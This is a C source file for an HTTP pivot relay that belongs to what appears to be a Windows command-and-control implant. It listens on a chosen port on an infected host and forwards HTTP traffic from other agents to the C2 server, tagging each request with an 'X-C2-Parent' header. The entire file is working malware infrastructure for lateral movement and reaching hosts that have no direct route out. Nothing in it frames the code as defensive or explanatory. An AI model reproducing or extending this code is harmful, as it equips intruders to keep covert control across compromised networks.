/* http_pivot.c — HTTP relay pivot server for the C agent. */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "api_resolve.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include "http_pivot.h"
#include "transport.h"

static volatile SOCKET g_hp_sock = INVALID_SOCKET;
static volatile int    g_hp_stop = 1;
static HANDLE          g_hp_thr  = NULL;
static char            g_hp_agid[64] = {0};

typedef struct { SOCKET client; } HpRelayParam;

static DWORD WINAPI hp_relay_proc(LPVOID p) {
    HpRelayParam *rp = (HpRelayParam*)p; SOCKET cs = rp->client; free(rp);
    char *buf = (char*)malloc(65537); if (!buf) { closesocket(cs); return 1; }
    int total = 0, hdr_end = -1, content_len = 0;
    while (total < 65536) {
        int n = recv(cs, buf + total, 65536 - total, 0);
        if (n <= 0) break;
        total += n; buf[total] = '\0';
        if (hdr_end < 0) {
            char *he = strstr(buf, "\r\n\r\n");
            if (he) {
                hdr_end = (int)(he - buf);
                char *cl = strstr(buf, "Content-Length:");
                if (!cl) cl = strstr(buf, "content-length:");
                if (cl) content_len = atoi(cl + 15);
            }
        }
        if (hdr_end >= 0 && (total - hdr_end - 4) >= content_len) break;
    }
    if (hdr_end < 0) { free(buf); closesocket(cs); return 1; }
    /* parse method + path */
    char method[16]="GET", path[512]="/", ct[128]="";
    sscanf(buf, "%15s %511s", method, path);
    /* find content-type */
    char *cthdr = strstr(buf, "Content-Type:"); if (!cthdr) cthdr = strstr(buf, "content-type:");
    if (cthdr) { cthdr += 13; while (*cthdr == ' ') cthdr++; int i=0; while (cthdr[i] && cthdr[i]!='\r' && i<127) { ct[i]=cthdr[i]; i++; } ct[i]='\0'; }
    const uint8_t *body = (const uint8_t*)(buf + hdr_end + 4);
    int body_len = total - hdr_end - 4; if (body_len < 0) body_len = 0;
    char extra_hdr[256];
    if (ct[0])
        snprintf(extra_hdr, sizeof(extra_hdr), "Content-Type: %s\r\nX-C2-Parent: %s\r\n", ct, g_hp_agid);
    else
        snprintf(extra_hdr, sizeof(extra_hdr), "X-C2-Parent: %s\r\n", g_hp_agid);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    agent_http_do(method, path, body, (size_t)body_len, extra_hdr, &resp, &resp_len, &status);
    char hdr_out[256];
    if (resp && resp_len > 0) {
        snprintf(hdr_out, sizeof(hdr_out), "HTTP/1.1 %d OK\r\nContent-Length: %zu\r\nContent-Type: application/octet-stream\r\n\r\n", status > 0 ? status : 200, resp_len);
        send(cs, hdr_out, (int)strlen(hdr_out), 0);
        send(cs, (const char*)resp, (int)resp_len, 0);
        free(resp);
    } else {
        snprintf(hdr_out, sizeof(hdr_out), "HTTP/1.1 %d OK\r\nContent-Length: 0\r\n\r\n", (status > 0 && status != 204) ? status : 204);
        send(cs, hdr_out, (int)strlen(hdr_out), 0);
        if (resp) free(resp);
    }
    free(buf); closesocket(cs); return 0;
}

static DWORD WINAPI hp_server_proc(LPVOID p) {
    int port = (int)(intptr_t)p;
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) return 1;
    g_hp_sock = ls;
    BOOL reuse = TRUE; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET; sa.sin_port = htons((uint16_t)port); sa.sin_addr.s_addr = INADDR_ANY;
    if (bind(ls, (struct sockaddr*)&sa, sizeof(sa)) != 0 || listen(ls, 16) != 0) {
        closesocket(ls); g_hp_sock = INVALID_SOCKET; return 1;
    }
    while (!g_hp_stop) {
        struct sockaddr_in ca; int cal = sizeof(ca);
        SOCKET cs = accept(ls, (struct sockaddr*)&ca, &cal);
        if (cs == INVALID_SOCKET) break;
        HpRelayParam *rp = (HpRelayParam*)malloc(sizeof(HpRelayParam)); rp->client = cs;
        HANDLE h = CreateThread(NULL, 0, hp_relay_proc, rp, 0, NULL);
        if (h) CloseHandle(h); else { free(rp); closesocket(cs); }
    }
    closesocket(ls); g_hp_sock = INVALID_SOCKET; return 0;
}

char *http_pivot_start(int port, const char *agent_id) {
    if (!g_hp_stop) return _strdup("[-] HTTP pivot already running");
    strncpy(g_hp_agid, agent_id ? agent_id : "", sizeof(g_hp_agid)-1);
    g_hp_stop = 0;
    g_hp_thr = CreateThread(NULL, 0, hp_server_proc, (LPVOID)(intptr_t)port, 0, NULL);
    if (!g_hp_thr) { g_hp_stop = 1; return _strdup("[-] HTTP pivot: CreateThread failed"); }
    char *out = (char*)malloc(128); snprintf(out, 128, "[+] HTTP pivot started on port %d", port); return out;
}

void http_pivot_stop(void) {
    g_hp_stop = 1;
    if (g_hp_sock != INVALID_SOCKET) closesocket((SOCKET)g_hp_sock);
    if (g_hp_thr) { WaitForSingleObject(g_hp_thr, 3000); CloseHandle(g_hp_thr); g_hp_thr = NULL; }
}
